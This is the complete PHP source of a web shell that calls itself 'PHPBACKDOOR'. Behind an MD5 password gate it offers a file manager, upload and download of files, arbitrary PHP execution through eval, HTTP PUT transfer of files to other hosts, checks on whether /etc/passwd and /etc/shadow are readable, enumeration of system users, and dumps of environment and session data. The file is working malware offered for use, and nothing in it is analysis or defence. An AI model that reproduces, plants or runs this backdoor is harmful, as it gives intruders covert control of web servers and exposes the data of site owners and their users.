   <?php

    /*
     *   PHPBACKDOOR 0.0.1
     *   https://sourceforge.net/projects/phpbackdoor/
     */

    /* A D M I N - P A S S W O R D ***** md5(pwd) ******/

    $strConfigPwd   = "63e780c3f321d13109c71bf81805476e";
    $strConfigShare = true;

    /* P H P - B D **** version 0.3 **** by R.H. *******/

    $strMode      = xGetParm("strMode","");
    $strName      = xGetParm("strName","");
    $strName2     = xGetParm("strName2","");
    $strName3     = xGetParm("strName3","");
    $strPathHome  = xGetParm("strPath",xGetPathNow());
    $strScriptUrl = xGetScriptUrl();
    $strInfo      = "";

    $strPwd       = md5(xGetParm("strPwd",""));
    @xUserLogin($strPwd,$strConfigPwd, $strScriptUrl,"strPwd");

    $strPathHome = xRealpath($strPathHome);
    if ($strMode == "download") {
      header("Content-type: ".xMineType($strPathHome));
      readfile($strPathHome);
      exit;
    }

    elseif ($strMode == "upload") {
      if(isset($_FILES)) {
        move_uploaded_file($_FILES['strFile']['tmp_name'],
                           $strPathHome."/".$_FILES['strFile']['name']);
        $strInfo = "upload ".$strPathHome."/".$_FILES['strFile']['name']."<br>";
        @chown($strPathHome."/".$_FILES['strFile']['name'],@getmyuid())
          or $strInfo.= "<br>$php_errormsg";
        @chgrp($strPathHome."/".$_FILES['strFile']['name'],@getmygid())
          or $strInfo.= "<br>$php_errormsg";
      }
      elseif(isset($HTTP_POST_FILES)){
        move_uploaded_file($HTTP_POST_FILES['strFile']['tmp_name'],
                           $strPathHome."/".$HTTP_POST_FILES['strFile']['name']);
        $strInfo = "upload ".$strPathHome."/".$HTTP_POST_FILES['strFile']['name']."<br>";
        @chown($strPathHome."/".$HTTP_POST_FILES['strFile']['name'],@getmyuid())
          or $strInfo.= "<br>$php_errormsg";
        @chgrp($strPathHome."/".$HTTP_POST_FILES['strFile']['name'],@getmygid())
          or $strInfo.= "<br>$php_errormsg";
      }
    }

    elseif ($strMode == "mkdir") {
      if (!(strlen($strName)==0)) {
        mkdir ($strPathHome."/".$strName, 0777);
       $strInfo = "mkdir ".$strPathHome."/".$strName."<br>";
      }
    }

    elseif ($strMode == "chmod") {
      if (!(strlen($strName2)==0)) {
        $strInfo = "chmod $strName $strName2<br>";
        @chmod($strName,$strName2) or  $strInfo="chmod ".$php_errormsg;
      }
    }

    elseif ($strMode == "httpput") {
      echo "<h1>Remote Install</h1>";
      $strServer = substr($strName2,7);
      $strFile = substr($strServer,strpos($strServer,"/"));
      $strServer = substr($strServer,0,strlen($strServer)-strlen($strFile));
      $strSize   = filesize($strName);
      echo "<pre>";
      echo "Source  <==  $strName \n";
      echo "Size     :   $strSize \n";
      echo "Target  ==>  $strName2 \n";
      echo "Server   :   $strServer \n";
      echo "File     :   $strFile \n";
      echo "Mode     :   $strName3 \n";
      echo "</pre>";
      $i = 0;
      if ($strName3 == "fopen") {
        $file = fopen ($strName2, "wb");
        if (!$file) {
          echo "can't acces to target.<br>\n";
          fclose ($file);
          exit;
        }
        $handle = fopen ($strName, "rb");
        while (!feof($handle)) {
          $buffer = fgets($handle, 4096);
          fputs ($file, $buffer ,strlen($buffer));
          $i++;
          if ($i>50) {echo "<br>\n";$i=0;}
          echo ".\n";
        }
        fclose ($handle);
        fclose ($file);
      }
      elseif ($strName3 == "socket") {
        $fp = fsockopen ("$strServer", 80, &$errno, &$errstr, 30);
        if (!$fp) {
          echo "$errstr ($errno)<br />\n";
          fclose($fp);
          exit;
        } else {
          fputs ($fp, "PUT $strFile HTTP/1.0\r\n");
          fputs ($fp, "Connection: Keep-Alive\r\n");
          fputs ($fp, "User-Agent: Mozilla/4.75 [en] (Win95; X)\r\n");
          fputs ($fp, "Pragma: no-cache\r\n");
          fputs ($fp, "Host: $strServer\r\n");
          fputs ($fp, "Content-Length: $strSize\r\n");
          fputs ($fp, "\r\n");
          $handle = fopen ($strName, "rb");
          while (!feof($handle)) {
            $buffer = fgets($handle, 4096);
            fputs ($fp, $buffer ,strlen($buffer));
            $i++;
            if ($i>50) {echo "<br>\n";$i=0;}
            echo ".\n";
          }
          fclose ($handle);
          echo "<br><pre>";
          while (!feof($fp)) {
            echo fgets($fp,128);
          }
        }
        fclose($fp);
      }
      exit;
    }

    elseif ($strMode == "info") {
     echo "<table border='0' width='100%'><tr><td align='left'>";
     echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode($strPathHome)."'>BACK</a> | ";
     if (is_writeable($strPathHome)){
       echo "</td><td align='right'><table border='0'><tr><td>";
       echo "<form enctype='text/html' action='$strScriptUrl' method='get'>".xGetSessionID(true);
       echo "<input name='strPath' type='hidden' value='$strPathHome'>";
       echo "<input name='strMode' type='hidden' value='chmod'>";
       echo "<input name='strName' type='hidden' value='$strName'>";
       echo "<input name='strName2' type='text' size='10' value='u+rwx,go+rx'>";
       echo "<input type='submit' value='chmod'>";
       echo "</td><td></form>";
       echo "<form enctype='text/html' action='$strScriptUrl' method='get'>".xGetSessionID(true);
       echo "<input name='strPath' type='hidden' value='$strPathHome'>";
       echo "<input name='strMode' type='hidden' value='rename'>";
       echo "<input name='strName' type='hidden' value='$strName'>";
       echo "<input name='strName2' type='text' size='40' value='$strName'>";
       echo "<input type='submit' value='rename'>";
       echo "</td><td></form>";
       echo "</td><td>";
       echo "<form enctype='text/html' action='$strScriptUrl' method='get'>".xGetSessionID(true);
       echo "<input name='strPath' type='hidden' value='$strPathHome'>";
       echo "<input name='strMode' type='hidden' value='delete'>";
       echo "<input name='strName' type='hidden' value='$strName'>";
       echo "<input type='submit' value='delete'>";
       echo "</td><td></form></td></tr></table>";
     }
     echo "</td></tr></table><hr><font face='courier' size='-1'>";
     echo "$strName<br><br>";
     if (is_readable($strPathHome) and !is_file($strPathHome)){
       echo "<form enctype='text/html' action='$strScriptUrl' method='get' target='put'>".xGetSessionID(true);
       echo "<input name='strPath' type='hidden' value='$strPathHome'>";
       echo "<input name='strMode' type='hidden' value='httpput'>";
       echo "<input name='strName' type='hidden' value='$strName'>";
       echo "<input type='submit' value='install to ==>>'>";
       echo "<input name='strName2' type='text' size='50' value='http://www.domain.net/path/file.txt'>";
       echo "<select name='strName3'><option value='fopen'>send as file<option value='socket'>send by socket</select>";
       echo "</td><td></form>";
     }
     $aryInfo=lstat($strName);
     foreach(array_keys($aryInfo) as $strKey){
        echo "$strKey = ".$aryInfo[$strKey]."<br>\n";
     }
     exit;
    }

    elseif ($strMode == "delete") {
      if (is_writeable($strName)) {
        $strInfo = "delete $strName";
        if (is_dir($strName)){
           @xRmDir($strName) or $strInfo=$php_errormsg;
        } else {
           @unlink($strName) or $strInfo=$php_errormsg;
        }
      }
    }

    elseif ($strMode == "rename") {
      if (is_writeable($strName)) {
        $strInfo = "rename $strName to $strName2";
        if (is_dir($strName)){
           @rename($strName,$strName2) or $strInfo=$php_errormsg;
        } else {
           @rename($strName,$strName2) or $strInfo=$php_errormsg;
        }
      }
    }

    elseif ($strMode == "sysinfo") {
      echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode($strPathHome)."'>BACK</a> | ";
      echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode(xGetPathNow());
      echo "&strMode=sysinfo&strName=sysinfo'>system</a> - ";
      echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode(xGetPathNow());
      echo "&strMode=sysinfo&strName=phpinfo'>phpinfo</a> - ";
      echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode(xGetPathNow());
      echo "&strMode=sysinfo&strName=env'>env</a> - ";
      echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode(xGetPathNow());
      echo "&strMode=sysinfo&strName=info'>sysinfo</a> - ";
      echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode(xGetPathNow());
      echo "&strMode=sysinfo&strName=user'>user</a> ";
      echo "<hr><font face='courier' size='-1'>";
      if ($strName == "sysinfo") {
        echo "<font size='+0'><pre>";
        echo "doc_root    ".xGetPathRoot()."\n";
        echo "getcwd      ".getcwd()."\n";
        echo "disk_free   ".@disk_free_space(getcwd())." Bytes \n";
        echo "disk_total  ".@disk_total_space(getcwd())." Bytes \n";
        echo "webserver   ".xGetServerEnv('SERVER_SOFTWARE')."\n";
        echo "serveradr   ".xGetServerEnv('SERVER_ADDR')." ".xGetServerEnv('SERVER_NAME')."\n";
        echo "webproxy    ".xGetServerEnv('HTTP_VIA')." ".xGetServerEnv('HTTP_FORWARDED')."\n";
        echo "\n";
        echo "savemode    ".(isset($PHP_SELF)?"OFF":"ON")."\n";
        echo "userid      ".@getmyuid()."\n";
        echo "groupid     ".@getmygid()."\n";
   /*
        $wget = fopen ("http://www.google.com/", "r");
        echo "httpget     ".(!$wget?"blocked":"access")."\n";
        fclose($wget);
        $wget = fopen ("ftp://www.google.com/", "r");
        echo "ftpget      ".(!$wget?"blocked":"access")."\n";
        fclose($wget);
        $socket = fsockopen ("www.example.com", 80, &$errno, &$errstr, 30);
        echo "socket      ".(!$socket?"blocked":"access")."\n";
        fclose($socket);
   */
        echo "\n";
        echo "/tmp        ".(is_readable("/tmp")?" access":"access blocked")."\n";
        echo "/proc       ".(is_readable("/proc")?" access":"access blocked")."\n";
        echo "/etc/passwd ".(is_readable("/etc/passwd")?" access":"access blocked")."\n";
        echo "/etc/shadow ".(is_readable("/etc/shadow")?" access":"access blocked")."\n";
        echo "</pre></font>";
      }
      elseif ($strName == "phpinfo") {
        phpinfo();
      }
      elseif ($strName == "info") {
        xPhpInfo();
      }
      elseif ($strName == "env") {
        xPhpEnv();
      }
      elseif ($strName == "user") {
        xUserInfo();
      }
      exit;
    }

    elseif ($strMode == "execphp") {
      echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode($strPathHome)."'>BACK</a> - exec php code";
      echo "<hr><font face='courier' size='-1'>";
      if (strlen($strName2)==0) $strName2 = "echo 'hello world';";
      $strName2 = stripslashes($strName2);
      echo "<form enctype='text/html' action='$strScriptUrl' method='post'>";
      echo xGetSessionID(true);
      echo "<input name='strPath' type='hidden' value='$strPathHome'>";
      echo "<input name='strMode' type='hidden' value='execphp'>";
      echo "<input name='strName' type='hidden' value='exec'>";
      echo "<textarea rows='15' cols='85' name='strName2'>$strName2</textarea><br>";
      echo "<input type='submit' value='exec php code'></form>";
      if ($strName == "exec") {
        @debugger_off;
        @eval($strName2) or die ($php_errormsg);
        @debugger_on;
      }
      exit;
    }


    echo "<table border='0' width='100%'><tr><td align='left'>";
    echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode("/")."'>ROOT</a> - ";
    echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode(xGetPathRoot())."'>HOME</a> - ";
    echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode(xGetPathNow())."'>MAIN</a> | ";
    echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode(xGetPathNow());
    echo "&strMode=sysinfo&strName=sysinfo'>system</a> - ";
    echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode(xGetPathNow());
    echo "&strMode=execphp&strName=edit&strName2='>php</a> | ";
    echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode(xGetPathNow());
    echo "&strPwd=d41d8cd98f00b204e9800998ecf8427e'>logout</a> ";
    if (is_writeable($strPathHome)){
      echo "</td><td align='right'><table border='0'><tr><td>";
      echo "<form enctype='text/html' action='$strScriptUrl' method='get'>".xGetSessionID(true);
      echo "<input name='strPath' type='hidden' value='$strPathHome'>";
      echo "<input name='strMode' type='hidden' value='mkdir'>";
      echo "<input name='strName' type='text' size='10'>";
      echo "<input type='submit' value='mkdir'>";
      echo "</td><td></form>";
      echo "</td><td>";
      echo "<form enctype='multipart/form-data' action='$strScriptUrl' method='post'>".xGetSessionID(true);
      echo "<input name='strPath' type='hidden' value='$strPathHome'>";
      echo "<input name='strMode' type='hidden' value='upload'>";
      echo "<input name='strFile' type='file' size='15'>";
      echo "<input type='submit' value='upload'>";
      echo "</td><td></form></td></tr></table>";
    }
    echo "</td></tr></table><hr><font face='courier' size='-1'>";

    $aryDir  = dir($strPathHome);
    $strPath = xRealpath($aryDir->path);
    echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode($strPath)."'>$strPath</a><br>";
    echo "<br>";
    while($strFile=$aryDir->read()) {
      $strFileName = xRealpath($strPath."/".$strFile);
      echo "<br>";
      $strFilePerm = substr("0000".sprintf("%o",fileperms($strFileName)),-3);
      echo " ".substr($strFilePerm,strlen($strFilePerm)-7,strlen($strFilePerm))." ";
      echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode($strPath);
      echo "&strName=".rawurlencode($strFileName);
      echo "&strMode=info'>";
       echo (is_readable($strFileName)?"R":"_");
       echo (is_writeable($strFileName)?"W":"_");
       echo (is_executable($strFileName)?"X":"_");
      echo "</a>";
      $strFileSize = "................".filesize($strFileName);
      echo " ".substr($strFileSize,strlen($strFileSize)-10,strlen($strFileSize))." ";
      echo (is_dir($strFileName)?"<b>":"");
      echo (is_link($strFileName)?"<i>":"");
      if (is_readable($strFileName)){
        if (is_dir($strFileName)) {
          echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode($strFileName)."'>$strFile</a>";
        }
        elseif (!(filesize($strFileName)==0)) {
          echo "<a href='$strScriptUrl?".xGetSessionID(false)."&strPath=".rawurlencode($strFileName);
          echo "&strMode=download' target='_blank'>$strFile</a>";
        }
        else {
          echo "$strFile";
        }
      }
      else {
        echo "$strFile";
      }
      echo (is_link($strFileName)?"</i>":"");
      echo (is_dir($strFileName)?"</b>":"");
     }
    $aryDir->close();

     echo "</font><br><br>$strInfo";
     exit;

    xPhpInfo();
    phpinfo();

    /* F U N K T I O N S E R W E I T E R U N G E N */

    function xMineType($strFile){
      $strMineType = "application/*";
      /* $strMineType = @mime_content_type($strFile); */
      return $strMineType;
    }

    function xRmDir($dir){
     $current_dir = opendir($dir);
      while($entryname = readdir($current_dir)){
        if(is_dir("$dir/$entryname") and ($entryname != "." and $entryname!="..")){
          xRmDir("${dir}/${entryname}");
        }elseif($entryname != "." and $entryname!=".."){
          unlink("${dir}/${entryname}");
        }
     }
     closedir($current_dir);
     rmdir(${dir});
    }


    function xRealpath($strPath){
      $strPathTemp = @realpath($strPath);
      $strPathTemp = (strlen($strPathTemp)==0?$strPath:$strPathTemp);
      return  $strPathTemp;
    }

    function xGetScriptUrl(){
      $strPath = "";
      if (isset($PHP_SELF)) {
        $strPath = $PHP_SELF; }
      elseif (isset($_SERVER['PHP_SELF'])) {
        $strPath = $_SERVER['PHP_SELF']; }
      elseif (isset($HTTP_SERVER_VARS['PHP_SELF'])) {
        $strPath = $HTTP_SERVER_VARS['PHP_SELF']; }
      elseif (isset($_ENV['PHP_SELF'])) {
        $strPath = $_ENV['PHP_SELF']; }
      elseif (isset($HTTP_ENV_VARS['PHP_SELF'])) {
        $strPath = $HTTP_ENV_VARS['PHP_SELF']; }
      elseif (isset($_SERVER['PATH_INFO'])) {
        $strPath = $_SERVER['PATH_INFO']; }
      elseif (isset($HTTP_SERVER_VARS['PATH_INFO'])) {
        $strPath = $HTTP_SERVER_VARS['PATH_INFO']; }
      elseif (isset($_ENV['PATH_INFO'])) {
        $strPath = $_ENV['PATH_INFO']; }
      elseif (isset($HTTP_ENV_VARS['PATH_INFO'])) {
        $strPath = $HTTP_ENV_VARS['PATH_INFO']; }
      elseif (isset($_SERVER['SCRIPT_URL'])) {
        $strPath = $_SERVER['SCRIPT_URL']; }
      elseif (isset($HTTP_SERVER_VARS['SCRIPT_URL'])) {
        $strPath = $HTTP_SERVER_VARS['SCRIPT_URL']; }
      elseif (isset($_ENV['SCRIPT_URL'])) {
        $strPath = $_ENV['SCRIPT_URL']; }
      elseif (isset($HTTP_ENV_VARS['SCRIPT_URL'])) {
        $strPath = $HTTP_ENV_VARS['SCRIPT_URL']; }
      return $strPath;
    }

    function xGetPathByFilename($strFileName){
      $aryPathInfo = pathinfo($strFileName);
      return $aryPathInfo["dirname"];
    }

    function xGetPathNow() {
      $strPath = "";
      if (isset($_SERVER['SCRIPT_FILENAME'])) {
        $strPath = xGetPathByFilename($_SERVER['SCRIPT_FILENAME']); }
      elseif (isset($HTTP_SERVER_VARS['SCRIPT_FILENAME'])) {
        $strPath = xGetPathByFilename($HTTP_SERVER_VARS['SCRIPT_FILENAME']); }
      elseif (isset($_SERVER['PATH_TRANSLATED'])) {
        $strPath = xGetPathByFilename($_SERVER['PATH_TRANSLATED']); }
      elseif (isset($HTTP_SERVER_VARS['PATH_TRANSLATED'])) {
        $strPath = xGetPathByFilename($HTTP_SERVER_VARS['PATH_TRANSLATED']); }
      else {
        $strPath = xGetPathRoot(); }
      return $strPath;
    }

    function xGetPathRoot() {
      $strPath = "";
      if (isset($DOCUMENT_ROOT)) {
        $strPath = $DOCUMENT_ROOT; }
      elseif (isset($_SERVER['DOCUMENT_ROOT'])) {
        $strPath = $_SERVER['DOCUMENT_ROOT']; }
      elseif (isset($HTTP_SERVER_VARS['DOCUMENT_ROOT'])) {
        $strPath = $HTTP_SERVER_VARS['DOCUMENT_ROOT']; }
      elseif (isset($_ENV['DOCUMENT_ROOT'])) {
        $strPath = $_ENV['DOCUMENT_ROOT']; }
      elseif (isset($HTTP_ENV_VARS['DOCUMENT_ROOT'])) {
        $strPath = $HTTP_ENV_VARS['DOCUMENT_ROOT']; }
      return $strPath;
    }

    function xGetServerEnv($strParmName) {
      $strPath = "";
      if (isset($_SERVER[$strParmName])) {
        $strPath = $_SERVER[$strParmName]; }
      elseif (isset($HTTP_SERVER_VARS[$strParmName])) {
        $strPath = $HTTP_SERVER_VARS[$strParmName]; }
      elseif (isset($_ENV[$strParmName])) {
        $strPath = $_ENV[$strParmName]; }
      elseif (isset($HTTP_ENV_VARS[$strParmName])) {
        $strPath = $HTTP_ENV_VARS[$strParmName]; }
      return $strPath;
    }

    function xGetParm($strParmName,$strInit){
      $strParm = $strInit;
      $strParm = (isset($_GET[$strParmName])?$_GET[$strParmName]:$strParm);
      $strParm = (isset($HTTP_GET_VARS[$strParmName])?$HTTP_GET_VARS[$strParmName]:$strParm);
      $strParm = (isset($_POST[$strParmName])?$_POST[$strParmName]:$strParm);
      $strParm = (isset($HTTP_POST_VARS[$strParmName])?$HTTP_POST_VARS[$strParmName]:$strParm);
      return $strParm;
    }

    function xPrintArray($aryData) {
      foreach(array_keys($aryData) as $strKey) {
        echo $strKey ."=". $aryData[$strKey] ."<br>\n";
      }
    }

    function xPhpInfo(){
      echo "<font size='+0'><pre>";
      echo "l o a d e d - e x t e n s i o n s\n";
      print_r (get_loaded_extensions());
      echo "d e f i n e d -  v a r s\n";
      print_r (get_defined_vars());
      echo "d e f i n e d -  c o n s t a n t s\n";
      print_r (get_defined_constants());
      echo "d e f i n e d - f u n c t i o n s\n";
      print_r (get_defined_functions());
      echo "</pre></font><hr>";
    }

    function xPhpEnv(){
      if (isset($PHP_SELF)){
        echo "PHP_SELF = $PHP_SELF<br>";
      }
      if (isset($HTTP_GET_VARS)) {
        echo "<br><b>HTTP_GET_VARS</b><br>";
        xPrintArray($HTTP_GET_VARS);
      }
      if (isset($_GET)){
        echo "<br><b>_GET</b><br>";
        xPrintArray($_GET);
      }
      if (isset($HTTP_POST_VARS)){
        echo "<br><b>HTTP_POST_VARS</b><br>";
        xPrintArray($HTTP_POST_VARS);
      }
      if (isset($_POST)){
        echo "<br><b>_POST</b><br>";
        xPrintArray($_POST);
      }
      if (isset($HTTP_SESSION_VARS)){
        echo "<br><b>HTTP_SESSION_VARS</b><br>";
        xPrintArray($HTTP_SESSION_VARS);
      }
      if (isset($_SESSION)){
        echo "<br><b>_SESSION</b><br>";
        xPrintArray($_SESSION);
      }
      if (isset($HTTP_POST_FILES)){
        echo "<br><b>HTTP_POST_FILES</b><br>";
        xPrintArray($HTTP_POST_FILES);
      }
      if (isset($_FILES)){
        echo "<br><b>_FILES</b><br>";
        xPrintArray($_FILES);
      }
      if (isset($HTTP_SERVER_VARS)){
        echo "<br><b>HTTP_SERVER_VARS</b><br>";
        xPrintArray($HTTP_SERVER_VARS);
      }
      if (isset($_SERVER)){
        echo "<br><b>_SERVER</b><br>";
        xPrintArray($_SERVER);
      }
      if (isset($HTTP_ENV_VARS)){
        echo "<b>HTTP_ENV_VARS</b><br>";
        xPrintArray($HTTP_ENV_VARS);
      }
      if (isset($_ENV)){
        echo "<b>_ENV</b><br>";
        xPrintArray($_ENV);
      }
    }

    function xUserInfo() {
     for ($i=0;$i<=65535;$i++){
      $bX=true;
      $dL=@posix_getpwuid($i) or $bX=false;
        if($bX){
           echo "<b>$i</b>";
           if (is_writeable($dL['dir'])) {
             echo " WRITE-ACCESS ";
             echo "<a href='$strScriptUrl?".xGetSessionID(false)
                 ."&strPath=".rawurlencode($dL['dir'])."' target='browse'>".$dL['dir']."</a>";
           }
           elseif (is_readable($dL['dir'])) {
             echo " READ-ACCESS ";
             echo "<a href='$strScriptUrl?".xGetSessionID(false)
                 ."&strPath=".rawurlencode($dL['dir'])."' target='browse'>".$dL['dir']."</a>";
           }
           echo "<br>\n";
           foreach(array_keys($dL) as $dK){
               $dV=$dL[$dK];
               echo "$dK = $dV<br>\n";
           }
         } // if
      } // for
    }

    function xUserLoginHtml($strScript,$strPrmName,$strInput) {
      global $strConfigShare;
      if (!$strConfigShare) {
      echo "<html><head><title>Login</title></head><body><center>";
      echo "<table border='0' width='90%' height='90%'><tr><td align='center' valign='middle'>";
      echo "<form action='$strScript' method='POST'>".xGetSessionID(true);
      echo "<input type='password' name='$strPrmName' value='' size='8'>";
      echo "<input type='submit' value='login'></form>";
      echo "<br>$strInput</td></tr></table></body></html>";
      } else {
      @xUserLoginHtmlShare($strScript,$strPrmName,$strInput);
      }
      exit;
    }

    function xUserLogin($strInput,$strPassword,$strScript,$strPrmName) {
      global $strIsLogin;
      session_start(); $strSessName="b707cf9b6c37a1a1cd61a6bb314decfb";
      if (isset($_SESSION)){
        if (!isset($_SESSION[$strSessName])) {
          $_SESSION[$strSessName]="";}
        if (!($strInput=="d41d8cd98f00b204e9800998ecf8427e")){
          $_SESSION[$strSessName]=($strInput==$strSessName?$strPassword:$strInput);}
        if (!($_SESSION[$strSessName]==$strPassword)){
          @xUserLoginHtml($strScript,$strPrmName,$strInput);
        }
      }
      if (isset($HTTP_SESSION_VARS)){
        if (!isset($HTTP_SESSION_VARS[$strSessName])) {
          $HTTP_SESSION_VARS[$strSessName]="";}
        if (!($strInput=="d41d8cd98f00b204e9800998ecf8427e")){
          $HTTP_SESSION_VARS[$strSessName]=($strInput==$strSessName?$strPassword:$strInput);}
        if (!($HTTP_SESSION_VARS[$strSessName]==$strPassword)){
          @xUserLoginHtml($strScript,$strPrmName,$strInput);
        }
      }
    }

    function xGetSessionID($bForm){
       if ($bForm) { return "<input type='hidden' name='".session_name()."' value='".session_id()."'>"; }
       else { return session_name()."=".session_id(); }
    }


    function xUserLoginHtmlShare($strScript,$strPrmName,$strInput) {
      global $strMode,$strName,$strName2,$strPathHome,$strScriptUrl;
      $strPathShare = getcwd();
      $strPathScript = xGetPathByFilename($strScriptUrl);
      $strPathScript = (strlen($strPathScript)==1?"/":$strPathScript);
      $strPathScript .= (substr($strPathScript,-1)=="/"?"":"/");

      if ($strMode == "download") {
        $aryDir  = dir($strPathShare);
        $strPath = xRealpath($aryDir->path);
        while($strFile=$aryDir->read()) {
          $strFileName = xRealpath($strPath."/".$strFile);
          if (md5($strFileName)==$strName){
            header("Content-type: ".xMineType($strFileName));
            readfile($strFileName);
          }
        }
        $aryDir->close();
        exit;
      }
      elseif ($strMode == "upload") {
        if(isset($_FILES)) {
          $strFileName = "";
          if (isset($_FILES))
             $strFileName = $strPathShare."/".$_FILES['strFile']['name'];
          elseif(isset($HTTP_POST_FILES))
             $strFileName = $strPathShare."/".$HTTP_POST_FILES['strFile']['name'];
          if (!file_exists($strFileName) and !(strtolower(substr($strFileName,-4))==".php"))
             move_uploaded_file($_FILES['strFile']['tmp_name'],$strFileName);
          else
             echo "file exists or php<br>";
        }
        elseif(isset($HTTP_POST_FILES)){
          if (!file_exists($strPathShare."/".$HTTP_POST_FILES['strFile']['name']))
          move_uploaded_file($HTTP_POST_FILES['strFile']['tmp_name'],
                             $strPathShare."/".$HTTP_POST_FILES['strFile']['name']);
          else echo "file exists<br>";
        }
      }

      echo "<form action='$strScript' method='POST'>".xGetSessionID(true);
      echo "<input type='password' name='$strPrmName' value='' size='8'>";
      echo "<input type='submit' value='login'> $strInput</form><font face='courier'>";

      echo "$strPathScript<br>";

      $aryDir  = dir($strPathShare);
      $strPath = xRealpath($aryDir->path);
      echo "$strPath<br>";
      while($strFile=$aryDir->read()) {
        $strFileName = xRealpath($strPath."/".$strFile);
        if (is_file($strFileName) and is_readable($strFileName)){
          $strFileSize = "................".filesize($strFileName);
          echo " ".substr($strFileSize,strlen($strFileSize)-10,strlen($strFileSize))." ";
          echo "<a href='$strPathScript$strFile' target='_blank'>$strPathScript$strFile</a> (";
          echo "<a href='$strScriptUrl?strMode=download&strName=".md5($strFileName)."' target='_blank'>source</a>) <br>\n";

        }
      }
      $aryDir->close();
      if (is_writeable($strPath)){
        echo "<form enctype='multipart/form-data' action='$strScriptUrl' method='post'>";
        echo "<input name='strMode' type='hidden' value='upload'>";
        echo "<input name='strFile' type='file' size='15'>";
        echo "<input type='submit' value='upload'>";
        echo "</form>";
      }

      echo round(@disk_free_space(getcwd())/1024/1024)." MB (".disk_free_space(getcwd())." Bytes) free\n";
      return;
    }

   ?>
